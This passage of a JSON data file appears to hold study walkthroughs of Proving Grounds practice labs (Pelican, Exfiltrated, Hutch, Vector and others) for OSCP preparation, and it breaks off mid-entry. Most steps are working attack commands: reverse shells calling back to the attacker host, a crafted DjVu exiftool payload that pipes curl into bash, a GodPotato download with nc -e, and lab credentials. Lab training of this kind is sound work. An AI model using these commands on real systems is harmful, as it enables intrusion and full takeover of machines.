      "v": "Egress is filtered: call back on port **80**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat /root/proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "📡 ZeroMQ on **4505/4506** means SaltStack.",
   "📦 Keep PoCs **offline**: there's no internet in the exam.",
   "✅ Confirm with `id` before you try for a shell."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/twiggy/{scans,loot,exploits} && cd ~/oscp/twiggy\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-algernon": {
  "title": "Windows · SmarterMail .NET Remoting RCE → direct SYSTEM",
  "ips": {
   "K": "192.168.45.245",
   "T": "192.168.120.110"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "The SmarterMail service runs as SYSTEM, so there is **no privesc step**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 3000 {T} -oN algernon_ports.txt"
     },
     {
      "t": "out",
      "v": "21 ftp | 80 http | 135 | 139 | 445 | 5040 | 9998 | 17001"
     }
    ]
   },
   {
    "h": "Identify SmarterMail",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -A -p 9998,17001 {T} -oN algernon_svc.txt\ncurl -sL http://{T}:9998 | grep -i -E \"stProductVersion|stProductBuild\""
     },
     {
      "t": "out",
      "v": "9998/tcp  open  http      Microsoft IIS 10.0  → /interface/root\n17001/tcp open  remoting  MS .NET Remoting services\nvar stProductBuild = \"6919 (Dec 11, 2018)\";"
     },
     {
      "t": "p",
      "v": "🎯 **SmarterMail build 6919**, with .NET Remoting exposed on **17001** (CVE-2019-7214)."
     }
    ]
   },
   {
    "h": "Get the exploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit smartermail\nsearchsploit -m 49216"
     },
     {
      "t": "out",
      "v": "SmarterMail Build 6985 - Remote Code Execution  | windows/remote/49216.py"
     },
     {
      "t": "p",
      "v": "It is written for build 6985, but 6919 is older and also vulnerable ✅"
     }
    ]
   },
   {
    "h": "Configure it",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sed -i \"s/^HOST=.*/HOST='{T}'/; s/^PORT=.*/PORT=17001/; s/^LHOST=.*/LHOST='{K}'/; s/^LPORT=.*/LPORT=17001/\" 49216.py\ngrep -nE \"^(HOST|PORT|LHOST|LPORT)=\" 49216.py"
     },
     {
      "t": "out",
      "v": "HOST='{T}'\nPORT=17001\nLHOST='{K}'\nLPORT=17001"
     }
    ]
   },
   {
    "h": "Exploit",
    "b": [
     {
      "t": "p",
      "v": "Terminal 1:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo rlwrap nc -lvnp 17001"
     },
     {
      "t": "p",
      "v": "Terminal 2:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 49216.py"
     },
     {
      "t": "out",
      "v": "whoami\nnt authority\\system"
     },
     {
      "t": "warn",
      "v": "Outbound traffic is filtered: your listener must use **port 17001**, a port the target already uses."
     }
    ]
   },
   {
    "h": "proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🔍 For unusual ports, run `nmap -A` and check the page source for version strings.",
   "📮 Ports **9998 + 17001** together mean SmarterMail.",
   "🔁 An exploit written for a newer build often works on older builds too.",
   "🚧 Outbound filtered? Listen on a port the target already uses (**17001** here)."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/algernon/{scans,loot,exploits} && cd ~/oscp/algernon\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-pelican": {
  "title": "Linux · Exhibitor RCE → gcore → root",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.64"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -sC -sV -p 22,80,2181,8080,8181 -Pn {T} -oN pelican_svc.txt"
     },
     {
      "t": "out",
      "v": "2181/tcp open  zookeeper 3.4.6\n8080/tcp open  http      Exhibitor Web UI"
     },
     {
      "t": "p",
      "v": "🎯 **Exhibitor** on 8080 lets you edit the `java.env` startup script, which is command injection."
     }
    ]
   },
   {
    "h": "Foothold: inject into the config",
    "b": [
     {
      "t": "p",
      "v": "Open `http://{T}:8080/exhibitor/v1/ui/index.html`, go to the **Config** tab, turn **Editing ON**, and put this in the **java.env script** field:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "$(bash -i >& /dev/tcp/{K}/80 0>&1)"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "out",
      "v": "uid=1000(charles)"
     },
     {
      "t": "warn",
      "v": "Egress is filtered: call back on port **80**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat /home/charles/local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc enumeration",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "find / -perm -u=s -type f 2>/dev/null"
     },
     {
      "t": "out",
      "v": "/usr/bin/gcore  <-- SUID, abnormal"
     },
     {
      "t": "warn",
      "v": "**If this doesn't match:** on most runs gcore isn't SUID. Instead `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/gcore` for charles. Then use `sudo gcore <PID>` in the next step."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo -l"
     }
    ]
   },
   {
    "h": "Root via a memory dump",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ps -ef | grep -i -E 'root|screen|backup'    # pick a root PID, e.g. 812\ncd /tmp\ngcore 812\nstrings core.812 | grep -i -E 'pass|pwd|root'"
     },
     {
      "t": "out",
      "v": "... password=<secret> ..."
     },
     {
      "t": "p",
      "v": "Write-ups usually find the secret in a root process called **password-store**. Dump that PID first."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "su root        # enter the recovered password\ncat /root/proof.txt"
     },
     {
      "t": "warn",
      "v": "The exact PID and secret vary: dump each root PID and run `strings` on it."
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🔍 **2181 + 8080** means ZooKeeper with Exhibitor.",
   "💥 A field that becomes a startup script means RCE.",
   "🧪 An odd SUID or sudo binary (`gcore`) is your privesc: check **GTFOBins**."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/pelican/{scans,loot,exploits} && cd ~/oscp/pelican\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-exfiltrated": {
  "title": "Linux · Subrion 4.2.1 upload bypass → root cron exiftool (CVE-2021-22204) → root",
  "ips": {
   "K": "192.168.45.245",
   "T": "192.168.228.163"
  },
  "steps": [
   {
    "h": "Recon and the vhost",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -sC -sV -p 22,80 -Pn {T} -oN exfil_svc.txt"
     },
     {
      "t": "out",
      "v": "22/tcp open  ssh\n80/tcp open  http   Apache httpd 2.4.41 (Ubuntu)\n| http-robots.txt: /backup/ /cron/? /front/ /install/ /panel/ /tmp/ /updates/\n|_http-title: Did not follow redirect to http://exfiltrated.offsec/"
     },
     {
      "t": "p",
      "v": "It redirects to `exfiltrated.offsec`, so add the name to /etc/hosts:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "echo '{T} exfiltrated.offsec' | sudo tee -a /etc/hosts\ncurl -s http://exfiltrated.offsec/panel/ | grep -o 'Subrion CMS v[0-9.]*'"
     },
     {
      "t": "out",
      "v": "Subrion CMS v4.2.1"
     }
    ]
   },
   {
    "h": "Subrion admin → upload a .phar shell",
    "b": [
     {
      "t": "p",
      "v": "The panel is at `/panel/`. **admin:admin** works. Version 4.2.1 has **CVE-2018-19422**: `.php` is blocked, but `.phar` still runs as PHP."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cp /usr/share/webshells/php/php-reverse-shell.php shell.phar\nsed -i \"s/^\\$ip = .*/\\$ip = '{K}';/; s/^\\$port = .*/\\$port = 4444;/\" shell.phar\ngrep -nE '^\\$ip|^\\$port' shell.phar"
     },
     {
      "t": "out",
      "v": "$ip = '{K}';\n$port = 4444;"
     },
     {
      "t": "warn",
      "v": "Edit the file **before** you upload it. Then upload it in **Panel → Content → Uploads**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 4444"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "curl http://exfiltrated.offsec/uploads/shell.phar"
     },
     {
      "t": "out",
      "v": "connect to [{K}] from (UNKNOWN) [{T}]\nuid=33(www-data) gid=33(www-data) groups=33(www-data)"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
     },
     {
      "t": "p",
      "v": "💡 \"Connection refused (111)\" means the server still has the old file with 127.0.0.1:1234. Re-upload the fixed one."
     },
     {
      "t": "p",
      "v": "💡 Script route: `searchsploit -m 49876` then `python3 49876.py -u http://exfiltrated.offsec/panel/ --user admin --pass admin`"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "find / -name local.txt 2>/dev/null"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc: find the root cron",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "cat /etc/crontab\ncat /opt/image-exif.sh"
     },
     {
      "t": "out",
      "v": "* * * * * root bash /opt/image-exif.sh\n\nIMAGES='/var/www/html/subrion/uploads'\nls $IMAGES | grep \"jpg\" | while read filename;\ndo\nexiftool \"$IMAGES/$filename\" >> $LOGFILE\ndone"
     },
     {
      "t": "p",
      "v": "Every minute, root runs **exiftool** on each `.jpg` in the uploads folder, and www-data can write there. That is **CVE-2021-22204**: a crafted DjVu file runs commands when exiftool reads it."
     },
     {
      "t": "p",
      "v": "`pspy64` shows the same thing if `/etc/crontab` is hidden."
     }
    ]
   },
   {
    "h": "Root: malicious DjVu named .jpg",
    "b": [
     {
      "t": "p",
      "v": "On Kali, build the payload:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo apt-get install -y djvulibre-bin\ncat > shell.sh << 'EOF'\n#!/bin/bash\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{K}\",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\nEOF\nprintf '(metadata \"\\\\c${system ('\"'\"'curl http://{K}/shell.sh | bash'\"'\"')};\")' > exploit\ncat exploit\ndjvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit\nmv exploit.djvu exploit.jpg\nfile exploit.jpg"
     },
     {
      "t": "out",
      "v": "(metadata \"\\c${system ('curl http://{K}/shell.sh | bash')};\")\nexploit.jpg: DjVu image or single page document"
     },
     {
      "t": "p",
      "v": "Kali tab 1:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo python3 -m http.server 80"
     },
     {
      "t": "p",
      "v": "Kali tab 2:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 4445"
     },
     {
      "t": "p",
      "v": "On the target (www-data):"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "wget http://{K}/exploit.jpg -O /var/www/html/subrion/uploads/exploit.jpg"
     },
     {
      "t": "p",
      "v": "⏳ Wait up to a minute for the cron job."
     },
     {
      "t": "out",
      "v": "connect to [{K}] from (UNKNOWN) [{T}]\n# id\nuid=0(root) gid=0(root) groups=0(root)"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat /root/proof.txt"
     },
     {
      "t": "warn",
      "v": "Use port **4445** for root, because your www-data shell is still on 4444."
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🌐 A redirect to a hostname means adding it to `/etc/hosts`.",
   "🔑 Try default logins like admin:admin, and use `.phar` when `.php` is blocked.",
   "✏️ Edit the reverse shell's IP and port **before** uploading.",
   "⏰ Read `/etc/crontab` and any script it calls; **pspy** finds hidden cron jobs.",
   "🖼️ A root cron running exiftool on a folder you can write to gives root through a crafted DjVu (**CVE-2021-22204**).",
   "🚫 The \"malicious filename\" trick doesn't work here, because the script quotes the filename."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/exfiltrated/{scans,loot,exploits} && cd ~/oscp/exfiltrated\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-hutch": {
  "title": "Windows AD · LDAP password → WinRM → SYSTEM",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.122"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "The domain is **hutch.offsec**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,5985,9389 -Pn {T} -oN hutch_svc.txt"
     },
     {
      "t": "p",
      "v": "🎯 It's a Domain Controller with **WinRM (5985)** open."
     }
    ]
   },
   {
    "h": "Anonymous LDAP",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ldapsearch -x -H ldap://{T} -b \"DC=hutch,DC=offsec\" \"(objectClass=user)\" | tee ldap_users.txt | grep -i -E \"description|info|sAMAccountName\""
     },
     {
      "t": "out",
      "v": "sAMAccountName: fmcsorley\ndescription: CrabSharkJellyfish192"
     },
     {
      "t": "p",
      "v": "🔑 The password is in the **description** field."
     }
    ]
   },
   {
    "h": "Validate the creds and get a shell",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nxc winrm {T} -u fmcsorley -p 'CrabSharkJellyfish192' | tee nxc_winrm.txt     # Pwn3d!\nevil-winrm -i {T} -u fmcsorley -p 'CrabSharkJellyfish192'"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type ..\\Desktop\\local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc to SYSTEM",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "whoami /priv"
     },
     {
      "t": "out",
      "v": "SeImpersonatePrivilege Enabled"
     },
     {
      "t": "p",
      "v": "On Kali, host GodPotato and nc.exe:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -m http.server 80"
     },
     {
      "t": "p",
      "v": "In evil-winrm:"
     },
     {
      "t": "code",
      "lang": "powershell",
      "v": "iwr http://{K}/GodPotato-NET4.exe -o C:\\Windows\\Temp\\gp.exe\niwr http://{K}/nc.exe -o C:\\Windows\\Temp\\nc.exe\nC:\\Windows\\Temp\\gp.exe -cmd \"C:\\Windows\\Temp\\nc.exe {K} 443 -e cmd.exe\""
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 443"
     },
     {
      "t": "out",
      "v": "nt authority\\system"
     },
     {
      "t": "warn",
      "v": "Egress is filtered: serve on **80**, catch on **443**."
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "If this doesn't match: read the LAPS password",
   "b": [
    {
     "t": "p",
     "v": "Most write-ups of Hutch don't show SeImpersonate for fmcsorley. The usual route: **LAPS** is set up and fmcsorley can read the Administrator password."
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "ldapsearch -x -H ldap://{T} -D 'hutch\\fmcsorley' -w 'CrabSharkJellyfish192' -b 'DC=hutch,DC=offsec' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd"
    },
    {
     "t": "out",
     "v": "ms-Mcs-AdmPwd: <the Administrator password>"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "evil-winrm -i {T} -u administrator -p '<password from above>'"
    }
   ]
  },
  "takeaways": [
   "🏢 On a DC, try an **anonymous LDAP bind** and read `description` and `info`.",
   "✅ Validate creds with `nxc` before anything else.",
   "🎟️ `whoami /priv` showing SeImpersonate means GodPotato or PrintSpoofer.",
   "🔐 A domain user with LAPS read rights means the local admin password.",
   "📦 Keep those binaries **offline**."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/hutch/{scans,loot,exploits} && cd ~/oscp/hutch\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-peppo": {
  "title": "Linux · ident → rbash escape → docker → root",
  "lab": {
   "name": "Peppo",
   "platform": "PG Practice",
   "os": "Linux"
  },
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.92.60"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- {T} -oN peppo_ports.txt"
     },
     {
      "t": "out",
      "v": "22/tcp  open ssh\n113/tcp open ident\n5432/tcp open postgresql\n8080/tcp open http-proxy\n10000/tcp open snet-sensor-mgmt"
     }
    ]
   },
   {
    "h": "ident leaks a username",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -A -p 22,113,5432,8080,10000 {T} -oN peppo_svc.txt"
     },
     {
      "t": "out",
      "v": "22/tcp    |_auth-owners: root\n8080/tcp  WEBrick 1.4.2  |_http-title: Redmine\n10000/tcp |_auth-owners: eleanor"
     },
     {
      "t": "p",
      "v": "The `auth-owners` check asks ident which user runs each service. Port 10000 is run by **eleanor**."
     }
    ]
   },
   {
    "h": "Foothold: username as password",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ssh eleanor@{T}\n# password: eleanor"
     },
     {
      "t": "p",
      "v": "🔑 Login: **eleanor : eleanor**"
     }
    ]
   },
   {
    "h": "Restricted shell (rbash)",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "echo $PATH\nls bin"
     },
     {
      "t": "out",
      "v": "/home/eleanor/bin\nchmod chown ed ls mv ping sleep touch"
     }
    ]
   },
   {
    "h": "Escape with ed + local.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ed\n!/bin/sh\nexport PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin\nid\ncat /home/eleanor/local.txt"
     },
     {
      "t": "out",
      "v": "uid=1000(eleanor) ... 999(docker)"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc: docker mounts the host FS",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "docker images\ndocker run -v /:/mnt --rm -it redmine chroot /mnt sh\nid\ncat /root/proof.txt"
     },
     {
      "t": "out",
      "v": "uid=0(root) gid=0(root)"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "👤 If port **113** is open, use `nmap -sC` or `ident-user-enum` to get usernames.",
   "🔑 For a new user, try the **username as the password** first.",
   "🧱 In rbash, look up each `~/bin` binary on GTFOBins: here `ed` gives `!/bin/sh`.",
   "🛣️ Fix **PATH** after you escape.",
   "🐳 The **docker group** equals root. Use an image the box already has (`docker images`)."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/peppo/{scans,loot,exploits} && cd ~/oscp/peppo\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-vector": {
  "title": "Windows · Padding oracle → RDP → backup.rar → Administrator",
  "lab": {
   "name": "Vector",
   "platform": "PG Practice",
   "os": "Windows"
  },
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.120.159"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- {T} -oN vector_ports.txt\nsudo nmap -sV -p 2290 {T} -oN vector_svc.txt"
     },
     {
      "t": "out",
      "v": "21 ftp | 80 http | 135 | 139 | 445 | 2290 http IIS 10.0 | 3389 rdp | 5985 winrm"
     }
    ]
   },
   {
    "h": "Web app on 2290: find the oracle",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "curl http://{T}:2290/?c=test\ncurl -s http://{T}:2290/?c=test | grep -A3 '<!--'"
     },
     {
      "t": "out",
      "v": "0\nAES-256-CBC-PKCS7 ciphertext: 4358b2f7...c59488\nVictor's TODO: Need to add authentication eventually.."
     },
     {
      "t": "p",
      "v": "The real ciphertext returns **1** and junk returns **0**, so the page tells you whether the padding is valid. That is a **padding oracle**, and the comment gives the user **victor**."
     },
     {
      "t": "warn",
      "v": "Copy the ciphertext from **your own** page source."
     }
    ]
   },
   {
    "h": "How it works",
    "b": [
     {
      "t": "list",
      "v": [
       "First 16 bytes are the IV, last 16 are the cipher block. Each IV byte changes the matching plaintext byte.",
       "Zero IV bytes from the left. The result flips to 0 at byte 13, so the message is 12 bytes with padding `04040404`.",
       "Recover one byte at a time from the right: `plain = guess ^ pad ^ orig_iv`."
      ]
     }
    ]
   },
   {
    "h": "Exploit: padding-oracle script",
    "b": [
     {
      "t": "p",
      "v": "A short Python script asks the oracle (`/?c=<iv><block>`) whether each guess gives valid padding, recovering the plaintext byte by byte. Run it against your copied ciphertext:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 po.py {T} 2290"
     },
     {
      "t": "out",
      "v": "[+] WormAloeVat7"
     },
     {
      "t": "p",
      "v": "🔑 Login: **victor : WormAloeVat7**"
     }
    ]
   },
   {
    "h": "RDP as victor + local.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "xfreerdp /v:{T}:3389 /u:victor /p:WormAloeVat7 /cert:ignore"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\victor\\Desktop\\local.txt\ncopy C:\\Users\\victor\\Downloads\\backup.rar C:\\FTPRoot\\backup.rar"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Pull backup.rar over FTP",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ftp {T}\n# victor / WormAloeVat7\nbinary\nget backup.rar\nquit"
     },
     {
      "t": "warn",
      "v": "Type `binary` first. ASCII mode corrupts the RAR file."
     }
    ]
   },
   {
    "h": "Open the RAR with victor's password",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "unrar e backup.rar\n# password: WormAloeVat7\ncat backup.txt | base64 -d"
     },
     {
      "t": "out",
      "v": "Administrator:EverywayLabelWrap375"
     }
    ]
   },
   {
    "h": "Administrator + proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "evil-winrm -i {T} -u Administrator -p 'EverywayLabelWrap375'"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "👀 Always **view the page source**: here the comments leaked the cipher, ciphertext and a username.",
   "🔐 AES-CBC with no integrity check + a 0/1 answer = **padding oracle**: read plaintext without the key.",
   "♻️ Try each recovered password on **RDP, WinRM, FTP** and any archives.",
   "📦 A writable FTP folder copies files out easily. Use **binary** mode.",
   "🧾 Base64 ending in `==` inside a backup should be decoded right away."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/vector/{scans,loot,exploits} && cd ~/oscp/vector\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-nickel": {
  "title": "Windows · POST leaks creds → PDF → SSH tunnel → SYSTEM",
  "ips": {
   "K": "192.168.118.11",
   "T": "192.168.120.209"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- {T} -oN nickel_ports.txt\nsudo nmap -A -p 8089,33333 {T} -oN nickel_svc.txt"
     },
     {
      "t": "out",
      "v": "21 ftp | 22 ssh | 135 | 139 | 3389 | 8089 http HTTPAPI | 33333 http HTTPAPI"
     }
    ]
   },
   {
    "h": "DevOps dashboard",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "curl http://{T}:8089\ncurl http://{T}:33333/list-running-procs"
     },
     {
      "t": "out",
      "v": "<form action='http://{T}:33333/list-running-procs' method='GET'>\n<p>Cannot \"GET\" /list-running-procs</p>"
     },
     {
      "t": "p",
      "v": "💡 \"Cannot GET\" means the page wants another method, so try **POST**."
     }
    ]
   },
   {
    "h": "Foothold: POST leaks the login",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "curl -s -X POST -H 'Content-Length: 0' http://{T}:33333/list-running-procs\necho Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 -d"
     },
     {
      "t": "out",
      "v": "DevTasks.exe ... --user ariah -p \"Tm93...MzkK\" --protocol ssh\nNowiseSloopTheory139"
     },
     {
      "t": "p",
      "v": "🔑 Login: **ariah : NowiseSloopTheory139**"
     }
    ]
   },
   {
    "h": "SSH + local.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ssh ariah@{T}"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\ariah\\Desktop\\local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
